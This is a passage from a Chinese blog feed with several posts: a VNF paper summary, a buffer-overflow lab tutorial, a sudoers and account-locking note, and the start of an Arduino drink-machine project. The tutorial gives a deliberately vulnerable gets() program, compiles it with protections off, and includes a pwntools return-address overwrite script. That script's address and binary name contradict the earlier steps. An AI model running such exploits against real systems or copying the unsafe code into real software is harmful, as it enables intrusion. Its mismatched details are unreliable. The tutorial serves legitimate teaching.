以及總成本 $minCost$ 作為演算法的輸出。</p><h2 id="Ch5-Performance-Evaluation"><a href="#Ch5-Performance-Evaluation" class="headerlink" title="Ch5-Performance Evaluation"></a>Ch5-Performance Evaluation</h2><p>在本節中，我們通過將基於鬆弛的算法 (“RLX”) 與 Cost-Min 的最佳結果 (“OPT”) 和最短路徑算法 (“SP”) 進行比較來評估它<br>實驗設置：</p><ul><li>網絡中有∣𝐷∣ &#x3D; 20 個資料中心。 $H_{dp}$ 隨機設置在 [1,20] 的範圍內，表示DC之間的跳躍數</li><li>共有 20 條服務鏈，多條鏈共享 15 種不同類型的網絡功能</li><li>服務鏈的流量設置在 [1, 10] 的範圍內</li><li>係數 $\gamma$ 設置為 10，$\delta$ 設置為 1</li><li>我們使用商業求解器 Gurobi 來解決我們的 Cost-Min 和 Cost-Min-LP 問題<br>本研究通過在不同場景中改變參數提供了廣泛的實驗</li></ul><h3 id="The-value-of-𝛾"><a href="#The-value-of-𝛾" class="headerlink" title="The value of 𝛾"></a>The value of 𝛾</h3><p><img src="https://i.imgur.com/Et8CiI7.png"><br>首先，我們調查𝛾和𝛿的影響。我們設置 𝛿 &#x3D; 1，並將 𝛾 的值從 5 變為 50。結果如圖 4 所示<br>圖 4 中的結果表明，三種算法的所有成本都隨著 𝛾 的增加而增長。原因是，𝛾的增加會導致更高的 VNF 部署成本。<br>得注意的是，SP 的增長率遠大於其他兩種算法，因為 SP 主要通過減少每個網絡流的路徑長度來關注通信成本，而忽略了部署成本。<br>因此，當部署成本成為主導部分時，SP 顯示的優勢較小<br>例如，當𝛾 &#x3D; 10 時，RLX 算法的部署成本佔總成本的比例為 57%，OPT 為 35%，SP 為 82%。</p><h3 id="The-effect-of-number-of-hops"><a href="#The-effect-of-number-of-hops" class="headerlink" title="The effect of number of hops"></a>The effect of number of hops</h3><p><img src="https://i.imgur.com/ctY1hjZ.png"><br>我們通過將跳數的上限從 2 變為 20 來研究不同網絡拓撲的 OPT、RLX 和 SP 的總成本<br>從圖 5 可以看出，OPT 和 RLX 的成本隨著跳數的增加而略有增長，因為跳數的增加可能會增加通信成本。</p><p>然而，SP卻呈現出下降的趨勢。主要原因是當不同數據中心之間的跳數都很小時，SP可以找到很多最短路徑並在這些路徑上部署VNF實例，而某些網絡功能可能有多個實例，導致部署成本較高。<br>當跳數增加時，SP 只會找到更少的最短路徑，從而導致 VNF 實例更少，部署成本更低。因此，總成本降低。</p><h3 id="The-effect-of-rate"><a href="#The-effect-of-rate" class="headerlink" title="The effect of rate"></a>The effect of rate</h3><p><img src="https://i.imgur.com/KaJ7KXI.png"><br>同樣，我們將 20 條鏈的速率要求上限從 3 更改為 30，以顯示流量要求的影響。<br>圖 6 顯示，當速率上限增加時，所有三種算法的總成本也會增加。<br>這是因為增加流量會導致更高的通信成本以及總成本。</p><h3 id="The-effect-of-the-number-of-chains"><a href="#The-effect-of-the-number-of-chains" class="headerlink" title="The effect of the number of chains"></a>The effect of the number of chains</h3><p><img src="https://i.imgur.com/AKitxrs.png"><br>在這一部分，我們討論了鏈數從 5 到 50 的影響，並比較了三種算法的結果。<br>所有三種算法的上升趨勢都可以在圖 7 中觀察到。<br>原因是更多的服務鏈帶來了更多的網絡功能部署在數據中心，更多的網絡流分佈到 VNF 實例。<br>這將導致更高的部署成本和通信成本，因此所有三種算法的總成本都會上升</p><h3 id="The-effect-of-the-number-of-NFs"><a href="#The-effect-of-the-number-of-NFs" class="headerlink" title="The effect of the number of NFs"></a>The effect of the number of NFs</h3><p><img src="https://i.imgur.com/CqLQxDV.png"><br>最後，圖 8 顯示了所有三種算法的結果，網絡功能的數量從 10 到 55 不等<br>可以得出，成本也上升了。這是因為所有算法都需要在數據中心放置更多的 VNF 實例，從而導致部署成本的增加。同時，不同數據中心的網絡功能之間更多的網絡流量也會導致通信成本的增加。因此，總成本呈上升趨勢。<br>儘管如此，我們的RLX 的優勢始終可以在任何設置下觀察到，因為它優於SP 並接近OPT</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>在本文中，我們研究了地理分佈式數據中心的 VNF 部署和網絡流量調度問題。我們進一步將此問題表述為混合整數線性規劃，目標是最小化總部署成本和通信成本。然後我們提出了一種低複雜度的基於鬆弛的算法來處理計算複雜度。大量基於模擬的性能評估結果表明，我們的算法具有更好的性能，可以有效降低各種場景下的總成本</p><h2 id="資料來源"><a href="#資料來源" class="headerlink" title="資料來源"></a>資料來源</h2><p><a href="https://ieeexplore.ieee.org/document/8422334">https://ieeexplore.ieee.org/document/8422334</a></p>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> VNF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>實驗緩衝區溢位漏洞 (Buffer Overflow)</title>
      <link href="/posts/Buffer_Overflow_Test.html"/>
      <url>/posts/Buffer_Overflow_Test.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>緩衝區溢位漏洞（Buffer Overflow)</strong> 是軟體和系統安全領域中最常見且嚴重的安全漏洞之一。現今數位時代中複雜的軟體系統常常面臨著來自駭客或惡意使用者的威脅。緩衝區溢位漏洞便是這些威脅中最令人擔憂的一種，因其對計算機系統造成的威脅程度不可忽視。</p><p>簡單來說，緩衝區溢位漏洞是指當程式碼嘗試將資料存儲在一個預先定義大小的<strong>記憶體區塊（稱為緩衝區）</strong> 中時，若輸入的資料量超過了緩衝區所能容納的最大值，多餘的資料將會溢出到相鄰的記憶體區域，從而可能覆蓋控制程式執行的指令或資料，進而產生意料之外的行為。</p><p>造成緩衝區溢位漏洞的根本原因是程式設計上的疏忽與錯誤。當程式開發者<strong>未能正確處理使用者輸入的情況</strong>，特別是<strong>未能對輸入進行充分的驗證和限制</strong>，就可能引發這樣的漏洞。攻擊者通常會藉由傳送特製的惡意輸入數據，利用這些未經檢查的輸入，使程式遭受緩衝區溢位攻擊。這種攻擊手法已經存在多年，並且在歷史上造成了許多嚴重的安全事件。</p><p>過去，許多知名的緩衝區溢位漏洞被廣泛報導，其中一些甚至對全球資訊安全產生了深遠影響。例如，著名的 <code>Code Red</code> 和 <code>Nimda</code> 蠕蟲就是利用緩衝區溢位漏洞來快速感染數以萬計的主機。同樣的，<code>Slammer</code> 蠕蟲也是利用微軟SQL Server中的緩衝區溢位漏洞，導致了全球互聯網流量的瞬間飆升。這些事件提醒了整個科技業界必須高度重視緩衝區溢位漏洞的威脅。</p><blockquote><p>SQL Slammer - <a href="https://en.wikipedia.org/wiki/SQL_Slammer">https://en.wikipedia.org/wiki/SQL_Slammer</a></p></blockquote><p>所以這篇文章就來簡單的實驗一下緩衝區溢位漏洞，至少讓我有點概念。</p><h2 id="環境配置"><a href="#環境配置" class="headerlink" title="環境配置"></a>環境配置</h2><p>在環境配置方面，我們使用 <strong>Windows Subsystem for Linux (WSL)</strong> 平台來配置開發環境，並且使用 <code>Ubuntu 20.04 LTS</code> 作為開發環境。我們將在這個環境中安裝所需的工具，包括 <code>Python3</code>、<code>Pwntool</code>，以及用於進行 GDB 除錯 的 <code>PEDA</code> 插件。</p><p>WSL 提供了一個在 Windows 系統上運行 Linux 發行版的功能，讓我們能夠在 Windows 環境中進行 Linux 相關的開發工作。Ubuntu 20.04 LTS 是一個穩定且常見的 Linux 發行版，其廣泛應用於開發和測試環境。</p><p>在進行環境配置之前，我們需要確保已安裝並運行了 WSL。安裝 WSL 可以參考微軟官方文檔或相關的線上教程。</p><blockquote><p><a href="https://learn.microsoft.com/zh-tw/windows/wsl/install">https://learn.microsoft.com/zh-tw/windows/wsl/install</a></p></blockquote><p>接下來，我們需要在 WSL 中安裝 Python3 和 Pwntool。Pwntool 是在 CTF中很常見，特別針對漏洞利用開發的 Python 函式庫。</p><p>在安裝 Pwntool 前，我們需要確保 git 已經在 WSL 中安裝，若未安裝則可使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>接下來，我們可以透過以下方法來安裝 Pwntool：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3 python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>現在我們已經在 WSL 中完成 Python3 和 Pwntool 的安裝。</p><p>接下來，我們將配置 GDB DEBUG環境，使用 PEDA 插件來幫助我們進行緩衝區溢位漏洞的演練。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>最後，這裡提供了一個簡單的 C 程式 <code>buffer_test.c</code> 作為我們實際演示緩衝區溢位漏洞的目標。該程式包含了一個 <code>uname()</code> 函數，其中使用了 <code>gets()</code> 函數來接收使用者輸入，但是未對輸入進行足夠的驗證，從而可能引發緩衝區溢位漏洞。</p><p>buffer_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh No! Your Hacker.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">uname</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input your name: \n&quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s \n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);  <span class="comment">//清除暫存</span></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    uname();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>程式中含有危險輸入函式 <strong>gets</strong> ，作為 Buffer Overflow的練習程式</p></div><h2 id="實驗步驟"><a href="#實驗步驟" class="headerlink" title="實驗步驟"></a>實驗步驟</h2><h3 id="一、-編譯程式"><a href="#一、-編譯程式" class="headerlink" title="一、 編譯程式"></a>一、 編譯程式</h3><p>首先，我們需要編譯名為 <code>buffer_test.c</code> 的程式碼，以便進行後續的實驗。編譯時我們需要關閉 <strong>Stack Canary</strong> 的防護機制，可以使用以下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc buffer_test.c -o buffer_test -fno-stack-protector -no-pie</span><br></pre></td></tr></table></figure><div class="note info flat"><p><code>-fno-stack-protector</code> ：關閉 Stack Canary 的防護機制</p></div><h2 id="二、-檢查防護措施"><a href="#二、-檢查防護措施" class="headerlink" title="二、 檢查防護措施"></a>二、 檢查防護措施</h2><p>在實驗開始前，需要確認目標程式的安全防護機制。可以用 &#96;checksec 指令可以快速查看目標執行檔的相關安全措施：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec buffer_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HuO3k3R.png"></p><h2 id="三、-確認目標："><a href="#三、-確認目標：" class="headerlink" title="三、 確認目標："></a>三、 確認目標：</h2><p>在進行攻擊之前，需要先確認目標。在這個實驗中，我們的目標是執行 &#96;target 函式，因此需要找到該函式的記憶體位址，並蓋過函式返回位址。</p><h2 id="四、確認函式記憶體位址"><a href="#四、確認函式記憶體位址" class="headerlink" title="四、確認函式記憶體位址"></a>四、確認函式記憶體位址</h2><p>透過 GDB 來查詢 <code>target</code> 函式的記憶體位址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb buffer_test</span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disas target</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l1S7BAX.png"></p><p>從上圖可得知，此function開始的位址在 <code>0x0000000000401196</code><br>得知了函式位址後，接著要知道如何從 input 蓋到 ret</p><h2 id="五、測試"><a href="#五、測試" class="headerlink" title="五、測試"></a>五、測試</h2><p>在實際進行攻擊之前，我們先在 GDB 中執行程式，並觀察它的行為：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peta$ </span><span class="language-bash">r    //先跑跑看</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/jdWT4BI.png"></p><p>程式會要求使用者輸入名字，並在名字輸入完畢後回應 <code>Hello, &#123;name&#125;</code>。由於原程式中容納使用者輸入的陣列只有 16 個位元組（<code>RBP ~ RBP-16</code>），<strong>所以我們可以透過輸入超過 16 個位元組的資料來觀察它的行為。</strong></p><p><img src="https://i.imgur.com/HOnCJiX.png" alt="Imgur"></p><p>如圖所示，當輸入超過 24 個位元組時，程式就會發生緩衝區溢位，並且在字元 v 後就發生崩潰。這表示我們需要至少 24 個位元組的輸入，才能成功蓋過函式返回位址。</p><blockquote><p>所以再 <code>8Bytes</code> 即可蓋完 ret address</p></blockquote><blockquote><p>RBP 那顯示只到 qrstuvwx，意思就是輸到24byte就爆了</p></blockquote><h2 id="六、實際用-Python-來覆蓋"><a href="#六、實際用-Python-來覆蓋" class="headerlink" title="六、實際用 Python 來覆蓋"></a>六、實際用 Python 來覆蓋</h2><p>為了進行實際的攻擊，將使用 Python 撰寫攻擊腳本。這個腳本將使用 <code>Pwntools</code> 函式庫來進行攻擊，蓋過程式中的函式返回位址，使之執行 <code>target</code> 函式。</p><p>攻擊腳本 attack.py 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./demo&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;input your name:&#x27;</span>) </span><br><span class="line">targer_address = p64(<span class="number">0x400667</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + targer_address)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>在攻擊腳本中，我們使用 <code>process()</code> 函式來執行 buffer_test 程式。接著，透過 <code>recvuntil()</code> 函式等待程式顯示 <strong>“input your name:”</strong> 的提示，然後將我們事先計算好的 <code>target</code> 函式位址加入到輸入資料中。最後，使用 <code>interactive()</code> 函式進入互動模式，以便觀察攻擊的結果。</p><ul><li><p><code>recvuntil()</code>：receive until，可接收特定字串，當到達目標字串時，執行xx指令</p></li><li><p><code>p8()</code>、<code>p32()</code>、<code>p64()</code></p><p> <img src="https://i.imgur.com/HZzm1tq.png"></p><ul><li><code>p32</code>：對data 打包 (32bit  integer)  &#x2F;&#x2F;u32：解包</li><li><code>p64</code>：對 data 打包 (64bit integer)  &#x2F;&#x2F;u64 :解包<br>轉成位址</li></ul></li><li><p><code>sendline(payload)</code>：發送payload，並換行</p></li><li><p><code>interactive()</code>：進入交互模式，可用來執行本地或遠端執行檔</p></li></ul><h2 id="七、-執行攻擊腳本"><a href="#七、-執行攻擊腳本" class="headerlink" title="七、 執行攻擊腳本"></a>七、 執行攻擊腳本</h2><p>最後，我們執行攻擊腳本以進行攻擊：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 attack.py</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hr1LHfQ.png"></p><p>攻擊成功後，程式將會執行 <code>target</code> 函式，並顯示 “Oh No! Your Hacker.” 的訊息，證明我們成功地利用緩衝區溢位漏洞進行了攻擊。</p><div class="note success flat"><p>成功執行target函式!</p></div><div class="note warning flat"><p>請記得在實際環境中應用所學的知識時，確保遵守相關法律法規，並僅在合法授權的情況下進行安全測試與漏洞利用。</p></div><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow">https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
            <tag> Buffer Overflow </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提升Linux系統管理技能：掌握SUDO權限配置和帳戶設定</title>
      <link href="/posts/555098e9.html"/>
      <url>/posts/555098e9.html</url>
      
        <content type="html"><![CDATA[<p>當我們在Linux系統中運行一般使用者帳戶時，有時會需要執行需要超級用戶權限的指令，例如更新軟體包或下載檔案等。然而，如果一般使用者沒有被授予sudo權限，就無法執行這些指令。<strong>為了讓一般使用者能夠使用sudo指令，我們需要進行sudoers設定</strong>。</p><p>這裡將介紹如何配置sudo權限以及其他有趣的帳戶存取相關的設定。</p><h1 id="sudoers設定檔"><a href="#sudoers設定檔" class="headerlink" title="sudoers設定檔"></a>sudoers設定檔</h1><p>在Linux系統中，可以使用sudoers設定檔來指定使用者、群組或別名的sudo權限。該設定檔通常位於<code>/etc/sudoers</code>。</p><p><img src="https://i.imgur.com/EcE7ix5.png"></p><p>然而，為了避免對sudoers設定檔進行錯誤的更改，我們應該使用 <code>visudo</code> 指令來編輯設定檔。</p><p><code>visudo</code> 在保存設定時會檢查是否存在錯誤的配置，例如錯誤的權限或語法問題。請注意，sudoers設定檔只能使用 <code>visudo</code> 指令來編輯，如果直接使用vim等編輯器，可能會遇到唯讀或無法覆寫的問題，會跳出 <strong>read-only，cannot override.</strong></p><p>可以使用以下命令來打開sudoers設定檔進行編輯：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo visudo</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/rqL2ZNl.png"></p><p>一旦打開了設定檔，可以在root行下方添加新的配置，指定要授予哪個使用者或群組什麼樣的權限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root  ALL=(ALL:ALL) ALL</span><br><span class="line">[user 帳號] [user的來源主機]=([可切換的身份])[可執行的指令]</span><br></pre></td></tr></table></figure><h1 id="其他有趣的帳戶存取設定"><a href="#其他有趣的帳戶存取設定" class="headerlink" title="其他有趣的帳戶存取設定"></a>其他有趣的帳戶存取設定</h1><h3 id="passwd-參數-l"><a href="#passwd-參數-l" class="headerlink" title="passwd 參數 -l"></a>passwd 參數 -l</h3><p><img src="https://i.imgur.com/NUH03vf.png"></p><p><code>passwd</code>  命令的-l參數用於鎖定帳戶密碼。<strong>當我們鎖定帳戶密碼時，系統會將密碼的雜湊值(放在 &#x2F;etc&#x2F;shadow )更改為系統中尚未使用的值。</strong> 鎖定的密碼在 <code>/etc/passwd</code> 檔案中的密碼雜湊值前面顯示一個驚嘆號(!)。因此，當我們使用以下命令鎖定帳戶密碼時：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l</span><br></pre></td></tr></table></figure><p>其他使用者使用sudo su等指令時，將無法切換為root用戶。<br>此外，我們可以使用chsh命令來更改帳戶的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span class="line">chsh [user/root]</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DHCIuI0.png"></p><p>上面的截圖顯示了passwd命令的輸出，其中root用戶的預設shell是 <code>/bin/bash</code>。<br>另外，而可以觀察到其他很多都是 <code>/usr/sbin/nologin</code>，這表示在本地或遠端都無法使用這個帳戶登錄。因此，如果將root的shell更改為 <code>/usr/sbin/nologin</code>，則沒有人可以訪問root帳戶。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>以上是有關配置sudo權限和更改帳戶shell的一些技巧。<br>透過這些設定，我們可以更好地管理Linux系統上的使用者權限和安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019通訊系畢業專題</title>
      <link href="/posts/4b76a41f.html"/>
      <url>/posts/4b76a41f.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/O3Xs5VC.jpg"></p><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>老實說一開始選擇教授時，並沒有想太多，只想找涼的教授，我記得當時的考量是 「對我們學校來說還是考研趕快換學校重要」因此沒有挑戰硬一點的主題&#x2F;教授 XD。所以最後我找了全系最涼的教授，專題主題每年都只定Arduino(原因應該是省錢又省時，也不太需要教)，6個專題生分成3組，每組2人。</p><p><strong>「Arduino + APP 遠端遙控」</strong>，其他主題包裝自己想。<br>既然技術簡單、架構清楚，看來要比的是創意和想法了~~~。在某一天的午後，我和組員要去買飲料，突然靈機一動，要是市面上手搖杯和飲料都能自動調配和無線操控，應該蠻不錯的喔！！！<br>因此我們的專題 「Smart Drinks 智慧飲料機」誕生了。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>我們將想達成的目標簡單分成幾個 part，來一一解決<br>APP + Wifi連接 + 移動飲料的方法 + 飲料機身<br>由於移動、調配飲料的方法是關鍵，會影響到整題機身設計<br>所以我們先設計調飲料方法(怎麼做，怎麼設計)。</p><h3 id="取料、調配方法"><a href="#取料、調配方法" class="headerlink" title="取料、調配方法:"></a>取料、調配方法:</h3><p>我們打算透過一個容器來裝載飲料原料，讓容器底部開孔，而底部之下黏一個紙板，紙板也開孔，但容器孔和紙板孔先不對齊，由servo motor來控制旋轉角度，進而使紙板孔和容器孔對齊，內容物則會自然落下。</p><p><img src="https://i.imgur.com/BdtsD1G.jpg"></p><p>所以這種取料方式，容器必須有一定高度，因此機身設計必須考慮這點。那可想而知，飲料杯必須在底部移動，進行取料，最後還要加水。</p><h3 id="移動方式："><a href="#移動方式：" class="headerlink" title="移動方式："></a>移動方式：</h3><p>設計 X、Y軸滑台(類似夾娃娃機上方的移動橫桿)，來讓飲料杯進行前後，左右的移動。<br>在大致規劃好要怎麼取料移動後，著手進行機身的設計</p><h3 id="機身設計："><a href="#機身設計：" class="headerlink" title="機身設計："></a>機身設計：</h3><p>透過便宜又環保的松木層板來進行裁切和組裝</p><p><img src="https://i.imgur.com/7CoF2dM.jpg"></p><p>由於沒有過木工經驗，耗費許久時間在木工上(木工已加入工具人skill set內)XD。 接著實作上方的取料罐和伺服馬達：</p><ul><li>取料罐：隨便一個罐子(有蓋)，將底部開洞，紅色蓋子處也開洞(洞口可自行設計形狀)</li></ul><p><img src="https://i.imgur.com/gWqliC7.jpg"></p><p>接著將紙板或珍珠板開略大於紅色蓋子孔的扇形洞，並透過小螺絲穿過紙板和容器板(以方便轉動)</p><ul><li>伺服馬達: 固定於上層層版側面，並與紙板相黏</li></ul><p><img src="https://i.imgur.com/Xze3y4W.jpg"></p><p>為了防止servo motor轉動時容器跟著轉動，用熱溶膠固定鐵絲和取料罐在層板上</p><p><img src="https://i.imgur.com/RGGwRKY.jpg"></p><p>這樣取料罐架構基本上就完成了，接著就重複3次，因為我們設了3個取料罐<br>開始實作最麻煩的X、Y軸滑台：<br>材料：步進馬達 x 2、螺旋軸 x 2(或直接去網購 絲軸)、軸承座 x 4、束帶、培林 x2、鐵桿 x 2<br>裁好合適的木頭並鑽孔放入鐵桿和 螺旋軸+ 步進馬達(*放入螺旋軸前須放入培林，避免螺旋軸轉動時將木板轉出來)，最後放入軸承座來乘載X軸，x軸做法同上。</p><iframe width="820" height="500" src="https://www.youtube.com/embed/atkGcfnsK3A" title="How to Make Homework Writing Machine at home" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>我們碰到最大的問題是：X軸太重，難以支撐，因此整個軸承座會卡住，南以轉動，後臨時透過小型玩具車來支撐解決這個問題</p><p><img src="https://i.imgur.com/gPWebQS.jpg"></p><blockquote><p>這樣飲料機身部分也完成了！！</p></blockquote><h3 id="硬體接線部分："><a href="#硬體接線部分：" class="headerlink" title="硬體接線部分："></a>硬體接線部分：</h3><p><img src="https://i.imgur.com/KmXl0AO.png"></p><p>所用元件： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- NodeMCU</span><br><span class="line">- Arduino Mega板</span><br><span class="line">- L298N x 2</span><br><span class="line">- 4-channel relay</span><br><span class="line">- 1-channel relay</span><br><span class="line">- servo x4</span><br><span class="line">- stepper motor x2</span><br><span class="line">- 沉水馬達 x2</span><br><span class="line">- power supply(可改用多個電池盒)</span><br></pre></td></tr></table></figure><p>想法：透過NodMCU接收指令來操控4個繼電器開關，每個繼電器又分別接到Arduino板電源，每個Arduino板對應一種飲料，預先燒好的code在Arduino內，電源開啟時則會自動執行取料和飲料調配程式。</p><p>ps. 上圖有只有實作一個Arduino板<br>ps.每個Arduino板必須在連到一個控制沉水馬達的繼電器上</p><p><img src="https://i.imgur.com/u38OXhA.jpg"></p><p>水管的位置會是飲料放置的起始點和終點(取原料回原位加水)</p><p><img src="https://i.imgur.com/hJ1RbRy.jpg"></p><p>NodeMCU 接線:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 4路繼電器</span><br><span class="line">- 分別接到4個Arduino電源孔</span><br><span class="line">- 4個Arduino 板分別將L298N 控制接腳接出來，分別控制滑台XY軸</span><br><span class="line">- 4個Arduino 其他pin 腳接出來控制4個 servo motor</span><br><span class="line">- 4個Arduino 某pin腳出來 接出來到沉水馬達訊號線。</span><br></pre></td></tr></table></figure><blockquote><p>注意電壓分配</p></blockquote><p>Arduino程式部分:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Arduino程式部分：</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Stepper.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 